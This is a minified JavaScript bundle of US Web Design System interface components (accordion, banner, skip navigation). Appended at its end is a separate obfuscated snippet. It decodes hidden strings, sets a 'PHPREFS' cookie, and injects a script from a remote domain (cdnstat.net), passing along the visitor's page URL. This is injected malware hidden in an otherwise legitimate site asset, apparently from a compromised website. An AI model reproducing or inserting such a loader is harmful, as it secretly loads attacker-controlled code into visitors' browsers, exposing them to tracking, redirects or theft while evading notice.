(() => {
    var t = {
            5075: (t, e, n) => {
                const r = n(4900),
                    o = n(6158),
                    i = n(8497),
                    c = n(8882),
                    {
                        CLICK: s
                    } = n(381),
                    {
                        prefix: u
                    } = n(1824),
                    a = `.${u}-accordion, .${u}-accordion--bordered`,
                    l = `.${u}-accordion__button[aria-controls]`,
                    d = "aria-expanded",
                    f = t => r(l, t).filter((e => e.closest(a) === t)),
                    p = (t, e) => {
                        const n = t.closest(a);
                        let r = e;
                        if (!n) throw new Error(`${l} is missing outer ${a}`);
                        r = i(t, e);
                        const o = n.hasAttribute("data-allow-multiple");
                        r && !o && f(n).forEach((e => {
                            e !== t && i(e, !1)
                        }))
                    },
                    h = o({
                        [s]: {
                            [l]() {
                                p(this), "true" === this.getAttribute(d) && (c(this) || this.scrollIntoView())
                            }
                        }
                    }, {
                        init(t) {
                            r(l, t).forEach((t => {
                                const e = "true" === t.getAttribute(d);
                                p(t, e)
                            }))
                        },
                        ACCORDION: a,
                        BUTTON: l,
                        show: t => p(t, !0),
                        hide: t => p(t, !1),
                        toggle: p,
                        getButtons: f
                    });
                t.exports = h
            },
            5784: (t, e, n) => {
                const r = n(6158),
                    {
                        CLICK: o
                    } = n(381),
                    {
                        prefix: i
                    } = n(1824),
                    c = `.${i}-banner__header`,
                    s = `${i}-banner__header--expanded`;
                t.exports = r({
                    [o]: {
                        [`${c} [aria-controls]`]: function(t) {
                            t.preventDefault(), this.closest(c).classList.toggle(s)
                        }
                    }
                })
            },
            9246: (t, e, n) => {
                const r = n(5689),
                    o = n(6158),
                    {
                        CLICK: i
                    } = n(381),
                    {
                        prefix: c
                    } = n(1824),
                    s = `.${c}-skipnav[href^="#"], .${c}-footer__return-to-top [href^="#"]`;
                t.exports = o({
                    [i]: {
                        [s]: function() {
                            const t = encodeURI(this.getAttribute("href")),
                                e = document.getElementById("#" === t ? "main-content" : t.slice(1));
                            e && (e.style.outline = "0", e.setAttribute("tabindex", 0), e.focus(), e.addEventListener("blur", r((() => {
                                e.setAttribute("tabindex", -1)
                            }))))
                        }
                    }
                })
            },
            1824: t => {
                t.exports = {
                    prefix: "usa"
                }
            },
            381: t => {
                t.exports = {
                    CLICK: "click"
                }
            },
            6158: (t, e, n) => {
                const r = n(9463),
                    o = n(4674),
                    i = (...t) => function(e = document.body) {
                        t.forEach((t => {
                            "function" == typeof this[t] && this[t].call(this, e)
                        }))
                    };
                t.exports = (t, e) => o(t, r({
                    on: i("init", "add"),
                    off: i("teardown", "remove")
                }, e))
            },
            8882: t => {
                t.exports = function(t, e = window, n = document.documentElement) {
                    const r = t.getBoundingClientRect();
                    return r.top >= 0 && r.left >= 0 && r.bottom <= (e.innerHeight || n.clientHeight) && r.right <= (e.innerWidth || n.clientWidth)
                }
            },
            4900: t => {
                t.exports = (t, e) => {
                    if ("string" != typeof t) return [];
                    var n;
                    e && (n = e) && "object" == typeof n && 1 === n.nodeType || (e = window.document);
                    const r = e.querySelectorAll(t);
                    return Array.prototype.slice.call(r)
                }
            },
            8497: t => {
                const e = "aria-expanded",
                    n = "hidden";
                t.exports = (t, r) => {
                    let o = r;
                    "boolean" != typeof o && (o = "false" === t.getAttribute(e)), t.setAttribute(e, o);
                    const i = t.getAttribute("aria-controls"),
                        c = document.getElementById(i);
                    if (!c) throw new Error(`No toggle target found with id: "${i}"`);
                    return o ? c.removeAttribute(n) : c.setAttribute(n, ""), o
                }
            },
            9421: () => {},
            9463: t => {
                t.exports = Object.assign
            },
            4674: (t, e, n) => {
                const r = n(9463),
                    o = n(7451),
                    i = n(1456),
                    c = /^(.+):delegate\((.+)\)$/;
                var s = function(t, e) {
                    var n = t[e];
                    return delete t[e], n
                };
                t.exports = function(t, e) {
                    const n = Object.keys(t).reduce((function(e, n) {
                        var u = function(t, e) {
                            var n, u, a = t.match(c);
                            a && (t = a[1], n = a[2]), "object" == typeof e && (u = {
                                capture: s(e, "capture"),
                                passive: s(e, "passive")
                            });
                            var l = {
                                selector: n,
                                delegate: "object" == typeof e ? i(e) : n ? o(n, e) : e,
                                options: u
                            };
                            return t.indexOf(" ") > -1 ? t.split(" ").map((function(t) {
                                return r({
                                    type: t
                                }, l)
                            })) : (l.type = t, [l])
                        }(n, t[n]);
                        return e.concat(u)
                    }), []);
                    return r({
                        add: function(t) {
                            n.forEach((function(e) {
                                t.addEventListener(e.type, e.delegate, e.options)
                            }))
                        },
                        remove: function(t) {
                            n.forEach((function(e) {
                                t.removeEventListener(e.type, e.delegate, e.options)
                            }))
                        }
                    }, e)
                }
            },
            4001: t => {
                t.exports = function(t) {
                    return function(e) {
                        return t.some((function(t) {
                            return !1 === t.call(this, e)
                        }), this)
                    }
                }
            },
            7451: (t, e, n) => {
                n(9421), t.exports = function(t, e) {
                    return function(n) {
                        var r = n.target.closest(t);
                        if (r) return e.call(r, n)
                    }
                }
            },
            1456: (t, e, n) => {
                const r = n(7451),
                    o = n(4001);
                t.exports = function(t) {
                    const e = Object.keys(t);
                    if (1 === e.length && "*" === e[0]) return t["*"];
                    const n = e.reduce((function(e, n) {
                        return e.push(r(n, t[n])), e
                    }), []);
                    return o(n)
                }
            },
            5689: t => {
                t.exports = function(t, e) {
                    var n = function(r) {
                        return r.currentTarget.removeEventListener(r.type, n, e), t.call(this, r)
                    };
                    return n
                }
            }
        },
        e = {};

    function n(r) {
        var o = e[r];
        if (void 0 !== o) return o.exports;
        var i = e[r] = {
            exports: {}
        };
        return t[r](i, i.exports, n), i.exports
    }
    n.n = t => {
        var e = t && t.__esModule ? () => t.default : () => t;
        return n.d(e, {
            a: e
        }), e
    }, n.d = (t, e) => {
        for (var r in e) n.o(e, r) && !n.o(t, r) && Object.defineProperty(t, r, {
            enumerable: !0,
            get: e[r]
        })
    }, n.o = (t, e) => Object.prototype.hasOwnProperty.call(t, e), (() => {
        "use strict";
        var t = n(5075),
            e = n.n(t),
            r = n(5784),
            o = n.n(r),
            i = n(9246),
            c = n.n(i);
        [e(), o(), c()].forEach((t => t.on()));
        const s = document.getElementById("main-content");
        document.querySelector(".usa-skipnav")?.addEventListener("click", (t => {
            t.preventDefault(), s?.scrollIntoView()
        }))
    })()
})();
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));